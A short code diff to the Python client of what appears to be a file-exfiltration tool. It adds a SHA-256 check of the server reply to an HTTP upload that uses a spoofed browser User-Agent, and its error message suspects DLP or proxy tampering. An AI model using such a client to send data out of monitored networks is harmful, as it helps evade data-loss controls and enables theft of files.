@@ -4,6 +4,7 @@ This is the web client code
 
 """
 
+import hashlib
 import sys
 import urllib.request
 import urllib.error
@@ -37,8 +38,12 @@ class Client:
             try:
                 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
                 req = urllib.request.Request(url, data_to_transmit, headers)
-                file = urllib.request.urlopen(req)
-                file.close()
+                resp = urllib.request.urlopen(req)
+                server_hash = resp.read().decode().strip()
+                resp.close()
+                local_hash = hashlib.sha256(data_to_transmit).hexdigest()
+                if server_hash and server_hash != local_hash:
+                    raise RuntimeError('Integrity check failed: data was modified in transit (DLP/proxy?)')
                 print('[*] File sent')
             except urllib.error.URLError as e:
                 raise RuntimeError(f'Web server unreachable on {self.remote_server}:{self.port} - {e}')
